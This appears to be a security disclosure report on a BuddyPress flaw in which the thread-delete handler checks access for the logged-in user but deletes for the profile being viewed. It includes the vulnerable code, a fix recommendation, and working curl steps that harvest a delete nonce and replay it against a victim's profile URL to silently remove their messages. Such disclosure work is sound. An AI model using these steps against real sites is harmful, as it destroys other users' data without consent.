## TL;DR
BuddyPress's message-delete handler checks access against the **logged-in user**
but deletes against the **profile currently being viewed** — and nothing forces
those to be the same person. If you share a thread with someone, visit their
profile URL and replay your own delete nonce: their copy of the conversation
disappears, yours stays untouched.
 
No elevated privilege needed. One shared message thread is enough. The victim
sees nothing — the thread is just gone from their inbox.
 
**One request. Victim's inbox. Silently wiped.**
 
## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |
 
## Description
When a private message thread is deleted, BuddyPress checks whether the currently logged-in user has access to it, but deletes the thread for whichever profile is currently being viewed. Those are normally the same person, but nothing forces them to be; visiting someone else's profile page while triggering the delete link targets that other person's copy of the conversation instead of the requester's own. A member who shares a thread with a target can silently delete that thread from the target's inbox, or eject the target from a group conversation, simply by changing which profile URL the delete link points at.
 
## Root Cause
 
- File: `bp-messages/actions/delete.php:25,33`
- Vulnerable code:
```php
if ( ! $thread_id || ! is_numeric( $thread_id ) || ! messages_check_thread_access( $thread_id ) ) {
    bp_core_redirect( $redirect );
} else {
    if ( ! check_admin_referer( 'messages_delete_thread' ) ) {
        return false;
    }
    if ( ! messages_delete_thread( $thread_id ) ) {
```
 
- Why it's wrong: `messages_check_thread_access()` defaults to `bp_loggedin_user_id()`. `messages_delete_thread()` (`bp-messages-functions.php:263-268`) defaults to `bp_displayed_user_id()` — the profile currently being viewed. The two calls silently resolve to different users: the access check passes for the attacker, but the deletion runs against the victim.

## Steps to Reproduce
 
**Privilege level:** ordinary authenticated member (`attacker`, subscriber) who shares a real message thread with the target — no elevated privilege, no moderator capability.
 
---
 
**Step 1 — Confirm the shared thread exists**
 
Seed data (a real shared thread, `id=4`, between attacker and victim):
 
```
recipients before:
  thread_id=4, user_id=3 (victim)   is_deleted=0
  thread_id=4, user_id=2 (attacker) is_deleted=0
```
 
---
 
**Step 2 — Harvest the delete nonce from attacker's own view**
 
```bash
curl -s -b attacker_cookies.txt \
  "http://127.0.0.1:8977/members/attacker/messages/view/4/" \
  | grep -o 'delete/4/?_wpnonce=[a-f0-9]*'
```
 
```
delete/4/?_wpnonce=fc45feba4d
```
 
The nonce action is a static string not bound to any thread ID — it is valid for any thread the attacker can normally delete.
 
---
 
**Step 3 — Replay the same nonce against the victim's profile URL**
 
```bash
curl -s -i -b attacker_cookies.txt \
  "http://127.0.0.1:8977/members/victim/messages/view/delete/4/?_wpnonce=fc45feba4d"
```
 
```
HTTP/1.1 302 Found
```
 
The 302 looks identical to a normal delete. The actual effect shows in the DB:
 
```
recipients after:
  thread_id=4, user_id=3 (victim)   is_deleted=1
  thread_id=4, user_id=2 (attacker) is_deleted=0
```
 
Victim's copy of the conversation is permanently deleted. Attacker's own copy is untouched. The mutation targeted the victim, not the requester.
 
## Recommendation
Pass the same resolved user ID to both `messages_check_thread_access()` and `messages_delete_thread()` in every action handler under `bp-messages/actions/`, and require `bp_is_my_profile() || bp_current_user_can( 'bp_moderate' )` before acting on a thread via someone else's profile URL.
 
## Impact
Any member who shares a message thread with a target — for a 1:1 conversation, that means simply having messaged them once — can delete that thread from the target's inbox, or for group threads eject the target entirely, without the target's knowledge or consent. No admin cooperation is needed and no special privilege beyond an ordinary account that has previously exchanged messages with the victim.
 
### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
